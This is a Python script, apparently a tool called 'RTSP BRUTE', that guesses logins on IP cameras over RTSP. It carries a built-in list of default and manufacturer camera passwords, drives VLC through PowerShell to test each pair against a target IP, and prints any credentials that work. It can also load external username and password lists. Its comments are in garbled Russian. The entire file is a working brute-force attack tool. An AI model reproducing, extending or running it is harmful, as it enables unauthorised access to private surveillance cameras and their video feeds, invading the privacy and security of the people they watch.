import subprocess
import requests
from time import sleep

def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

def gradient_text(text, start_color, end_color):
    def hex_to_rgb(hex_color):
        hex_color = hex_color.lstrip('#')
        return tuple(int(hex_color[i:i+2], 16) for i in (0, 2, 4))

    start_rgb = hex_to_rgb(start_color)
    end_rgb = hex_to_rgb(end_color)

    def interpolate_color(start_rgb, end_rgb, factor):
        return tuple(int(start_rgb[i] + (end_rgb[i] - start_rgb[i]) * factor) for i in range(3))

    length = len(text)
    gradient_text = ''

    for i, char in enumerate(text):
        factor = i / (length - 1)
        color = interpolate_color(start_rgb, end_rgb, factor)
        gradient_text += f'[38;2;{color[0]};{color[1]};{color[2]}m{char}'

    gradient_text += '[0m'  # —Å–±—Ä–æ—Å —Ü–≤–µ—Ç–∞
    return gradient_text

def check_rtsp_connection(ip, port, username, password):
    rtsp_url = f"rtsp://{username}:{password}@{ip}:{port}/"
    powershell_command = f'Start-Process vlc -ArgumentList "--intf", "dummy", "--run-time=10", "--play-and-exit", "{rtsp_url}"'

    command = [
        "powershell",
        "-Command",
        powershell_command
    ]

    try:
        result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=20)
        stderr_output = result.stderr
        stdout_output = result.stdout

        if b"401 Unauthorized" in stderr_output:
            return False, "Unauthorized"  # –ù–µ–≤–µ—Ä–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
        elif b"Error" in stderr_output:
            return False, "Error"  # –û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
        elif stdout_output:
            return True, stderr_output.decode('utf-8', errors='replace')  # –£—Å–ø–µ—à–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
        else:
            return False, "Unknown Error"
    except subprocess.TimeoutExpired:
        return False, "Timeout"  # –¢–∞–π–º–∞—É—Ç –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
    except Exception as e:
        return False, str(e)  # –î—Ä—É–≥–∏–µ –∏—Å–∫–ª—é—á–µ–Ω–∏—è

def load_credentials(usernames_file, passwords_file):
    with open(usernames_file, 'r', encoding='utf-8', errors='ignore') as uf, open(passwords_file, 'r', encoding='utf-8', errors='ignore') as pf:
        usernames = [line.strip() for line in uf.readlines()]
        passwords = [line.strip() for line in pf.readlines()]
    return usernames, passwords


def check_http_connection(ip):
    http_urls = [
        f"http://{ip}:80",
        f"http://{ip}:443",
        f"http://{ip}:8080",
        f"http://{ip}:8000",
        f"http://{ip}:8888",
        f"http://{ip}:10001"
    ]
    headers = {'User-Agent': 'Mozilla/5.0'}
    for url in http_urls:
        try:
            response = requests.get(url, headers=headers, timeout=2)
            if response.status_code == 200:
                print(gradient_text(f"HTTP Adress: {url}", "#00FF00", "#32CD32"))  # –ó–µ–ª–µ–Ω—ã–π
                return True
        except requests.exceptions.RequestException:
            continue
    return False


def load_credentials(usernames_file, passwords_file):
    with open(usernames_file, 'r') as uf, open(passwords_file, 'r') as pf:
        usernames = [line.strip() for line in uf.readlines()]
        passwords = [line.strip() for line in pf.readlines()]
    return usernames, passwords


# –õ–æ–≥–æ—Ç–∏–ø —Å –≥—Ä–∞–¥–∏–µ–Ω—Ç–æ–º
logo = """
    ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà  ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà  ‚ñà‚ñà‚ñì‚ñà‚ñà‚ñà      ‚ñÑ‚ñÑ‚ñÑ‚ñÑ    ‚ñà‚ñà‚ñÄ‚ñà‚ñà‚ñà   ‚ñà    ‚ñà‚ñà ‚ñÑ‚ñÑ‚ñÑ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà
    ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñí‚ñà‚ñà    ‚ñí ‚ñì‚ñà‚ñà‚ñë  ‚ñà‚ñà‚ñí   ‚ñì‚ñà‚ñà‚ñà‚ñà‚ñà‚ñÑ ‚ñì‚ñà‚ñà ‚ñí ‚ñà‚ñà‚ñí ‚ñà‚ñà  ‚ñì‚ñà‚ñà‚ñí‚ñì  ‚ñà‚ñà‚ñí ‚ñì‚ñí‚ñì‚ñà   ‚ñÄ
    ‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñë ‚ñì‚ñà‚ñà‚ñÑ   ‚ñì‚ñà‚ñà‚ñë ‚ñà‚ñà‚ñì‚ñí     ‚ñí‚ñà‚ñà‚ñí ‚ñÑ‚ñà‚ñà‚ñì‚ñà‚ñà ‚ñë‚ñÑ‚ñà ‚ñí‚ñì‚ñà‚ñà  ‚ñí‚ñà‚ñà‚ñë‚ñí ‚ñì‚ñà‚ñà‚ñë ‚ñí‚ñë‚ñí‚ñà‚ñà‚ñà
    ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë   ‚ñí   ‚ñà‚ñà‚ñí‚ñí‚ñà‚ñà‚ñÑ‚ñà‚ñì‚ñí ‚ñí   ‚ñí‚ñà‚ñà‚ñë‚ñà‚ñÄ  ‚ñí‚ñà‚ñà‚ñÄ‚ñÄ‚ñà‚ñÑ  ‚ñì‚ñì‚ñà  ‚ñë‚ñà‚ñà‚ñë‚ñë ‚ñì‚ñà‚ñà‚ñì ‚ñë ‚ñí‚ñì‚ñà  ‚ñÑ
    ‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí  ‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñí ‚ñë  ‚ñë   ‚ñë‚ñì‚ñà  ‚ñÄ‚ñà‚ñì‚ñë‚ñà‚ñà‚ñì ‚ñí‚ñà‚ñà‚ñí‚ñí‚ñí‚ñà‚ñà‚ñà‚ñà‚ñà‚ñì   ‚ñí‚ñà‚ñà‚ñí ‚ñë ‚ñë‚ñí‚ñà‚ñà‚ñà‚ñà‚ñí
    ‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë  ‚ñí ‚ñë‚ñë   ‚ñí ‚ñí‚ñì‚ñí ‚ñí ‚ñë‚ñí‚ñì‚ñí‚ñë ‚ñë  ‚ñë   ‚ñë‚ñí‚ñì‚ñà‚ñà‚ñà‚ñÄ‚ñí‚ñë ‚ñí‚ñì ‚ñë‚ñí‚ñì‚ñë‚ñë‚ñí‚ñì‚ñí ‚ñí ‚ñí   ‚ñí ‚ñë‚ñë   ‚ñë‚ñë ‚ñí‚ñë ‚ñë
    ‚ñë‚ñí ‚ñë ‚ñí‚ñë    ‚ñë    ‚ñë ‚ñë‚ñí  ‚ñë ‚ñë‚ñë‚ñí ‚ñë        ‚ñí‚ñë‚ñí   ‚ñë   ‚ñë‚ñí ‚ñë ‚ñí‚ñë‚ñë‚ñë‚ñí‚ñë ‚ñë ‚ñë     ‚ñë     ‚ñë ‚ñë  ‚ñë
    ‚ñë‚ñë   ‚ñë   ‚ñë      ‚ñë  ‚ñë  ‚ñë  ‚ñë‚ñë           ‚ñë    ‚ñë   ‚ñë‚ñë   ‚ñë  ‚ñë‚ñë‚ñë ‚ñë ‚ñë   ‚ñë         ‚ñë 
    ‚ñë                    ‚ñë               ‚ñë         ‚ñë        ‚ñë                 ‚ñë  ‚ñë 
                        HAS NO BRUTEFORCE PASSWORD | WAIT TO ALPHA!
                            !!!YOU NEED VLC IN SYSTEM PATH!!!
    """

if __name__ == "__main__":
    clear_console()
    print(gradient_text(logo, "#1000FF", "#FFFFFF"))  # –°–∏–Ω–µ-–±–µ–ª—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç

    ip = input("Camera IP: ")
    port = input("Port (Default 554): ") or "554"
    ports = [int(port)]

    # –î–µ—Ñ–æ–ª—Ç–Ω—ã–µ –ª–æ–≥–∏–Ω—ã –∏ –ø–∞—Ä–æ–ª–∏
    usernames = [
        "admin",
        "camera",
        "root",
        "sync",
        "sys",
        "supervisor",
        "nobody",
        "service",
        "default",
        "bin",
        "daemon",
        "defaul",
        "ftp",
        "ubnt",
        "admin1",
        "administrator",
        "666666",
        "888888",
        "Admin",
        "Administrator",
        "Dinion"
    ]

    passwords = [
        "camera",
        "pass",
        "password",
        "admin",
        "Admin",
        "default",
        "realtek",
        "root",
        "service",
        "ubnt",
        "unknown",
        "user",
        "supervisor",
        "support",
        "system",
        "tech",
        "smcadmin",
        "dreambox",
        "anko",
        "ccadmin",
        "cxlinux",
        "fliradmin",
        "00000000",
        "1111",
        "111111",
        "1111111",
        "123",
        "1234",
        "12345",
        "123456",
        "54321",
        "4321",
        "666666",
        "888888",
        "9999",
        "1234qwer",
        "cat1029",
        "IPCam@sw",
        "anni2013",
        "annie2012",
        "2601hx",
        "059AnkJ",
        "4uvdzKqBkj.jg",
        "7ujMko0admin",
        "7ujMko0vizxv",
        "OxhlwSG8",
        "S2fGqNFs",
        "Zte521",
        "/*6.=_ja",
        "avtech97",
        "fxjvt1805",
        "hdipc%No",
        "hi3518",
        "hichiphx",
        "hipc3518",
        "hkipc2016",
        "hslwificam",
        "ikwb",
        "ikwd",
        "ipc71a",
        "ivdev",
        "juantech",
        "jvbzd",
        "jvc",
        "jvtsmart123",
        "klv123",
        "klv1234",
        "meinsm",
        "tlJwpbo6",
        "vhd1206",
        "vizxv",
        "wbox123",
        "xc3511",
        "xmhdipc",
        "zlxx.",
        "laohuqian",
        "fxsdk+",
        "HI2105CHIP"
    ]

    # –ü—Ä–æ–≤–µ—Ä–∫–∞ –¥–æ—Å—Ç—É–ø–Ω–æ—Å—Ç–∏ HTTP –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞
    http_accessible = check_http_connection(ip)
    if not http_accessible:
        print(gradient_text(f"HTTP Closed {ip} Maybe camera OFFED", "#FF0000",
                            "#FF4500"))  # –ö—Ä–∞—Å–Ω—ã–π

    # –ü—Ä–æ–¥–æ–ª–∂–µ–Ω–∏–µ –ø—Ä–æ–≤–µ—Ä–∫–∏ RTSP –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
    credentials_found = False
    first_attempt = None
    second_attempt = None

    for port in ports:
        for username in usernames:
            for password in passwords:
                print(f"–ü—Ä–æ–≤–µ—Ä–∫–∞ {username}:{password}")
                success, message = check_rtsp_connection(ip, port, username, password)
                if success:
                    if not first_attempt:
                        first_attempt = (username, password)
                    elif first_attempt == (username, password):
                        second_attempt = (username, password)

                    if first_attempt and second_attempt and first_attempt == second_attempt:
                        print(gradient_text(
                            f"FOUNDED ACCOUNT! IP: {ip}, Port: {port}, Username: {username}, Password: {password}",
                            "#00FF00", "#32CD32"))  # –ó–µ–ª–µ–Ω—ã–π
                    else:
                        print(gradient_text(
                            f"FOUNDED ACCOUNT! (may incorrect): IP: {ip}, Port: {port}, Username: {username}, Password: {password}",
                            "#FFFF00", "#FFF000"))  # –ñ–µ–ª—Ç—ã–π
                    credentials_found = True
                    break
                else:
                    if message == "Unauthorized":
                        print(gradient_text("Closed Access", "#FFFF00", "#FFF000"))  # –ñ–µ–ª—Ç—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç
                    elif message == "Timeout":
                        print(gradient_text("Timeout", "#FFFF00", "#FFF000"))  # –ñ–µ–ª—Ç—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç
                    else:
                        print(gradient_text(f"Error when join: {message}", "#FF0000", "#FF4500"))  # –ö—Ä–∞—Å–Ω—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç
            if credentials_found:
                break
            if credentials_found:
                break
            sleep(1)  # –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–¥–µ—Ä–∂–∫—É –º–µ–∂–¥—É –ø–æ–ø—ã—Ç–∫–∞–º–∏ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è, —á—Ç–æ–±—ã –∏–∑–±–µ–∂–∞—Ç—å —Å–ª–∏—à–∫–æ–º —á–∞—Å—Ç—ã—Ö –ø–æ–ø—ã—Ç–æ–∫

            # –ï—Å–ª–∏ –¥–µ—Ñ–æ–ª—Ç–Ω—ã–µ —É—á–µ—Ç–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –Ω–µ –ø–æ–¥–æ—à–ª–∏ –∏–ª–∏ –Ω–µ –±—ã–ª–∏ —Å—Ç–∞–±–∏–ª—å–Ω—ã, —Å–ø—Ä–∞—à–∏–≤–∞–µ–º –ø—É—Ç—å –∫ —Ñ–∞–π–ª–∞–º —Å –ª–æ–≥–∏–Ω–∞–º–∏ –∏ –ø–∞—Ä–æ–ª—è–º–∏
            if not credentials_found or (first_attempt and second_attempt and first_attempt != second_attempt):
                use_db = input("Use your DATABASE? (Y/N): ")
                if use_db.strip().lower() == 'y':
                    usernames_file = input("Enter username path: ")
                    passwords_file = input("Enter login path: ")
                    other_usernames, other_passwords = load_credentials(usernames_file, passwords_file)

                    for port in ports:
                        for username in other_usernames:
                            for password in other_passwords:
                                success, message = check_rtsp_connection(ip, port, username, password)
                                if success:
                                    print(gradient_text(
                                        f"FOUNDED ACCOUNT! IP: {ip}, Port: {port}, Username: {username}, Password: {password}",
                                        "#00FF00", "#32CD32"))  # –ó–µ–ª–µ–Ω—ã–π
                                    credentials_found = True
                                    break
                                else:
                                    if message == "Unauthorized":
                                        print(gradient_text("Error access", "#FFFF00",
                                                            "#FFF000"))  # –ñ–µ–ª—Ç—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç
                                    elif message == "Timeout":
                                        print(gradient_text("Timeout", "#FFFF00",
                                                            "#FFF000"))  # –ñ–µ–ª—Ç—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç
                                    else:
                                        print(gradient_text(f"Error when join: {message}", "#FF0000",
                                                            "#FF4500"))  # –ö—Ä–∞—Å–Ω—ã–π –≥—Ä–∞–¥–∏–µ–Ω—Ç
                            if credentials_found:
                                break
                        if credentials_found:
                            break
                        sleep(1)

                    # –ü–∞—É–∑–∞ –ø–µ—Ä–µ–¥ –∑–∞–≤–µ—Ä—à–µ–Ω–∏–µ–º
                input("Enter to exit")
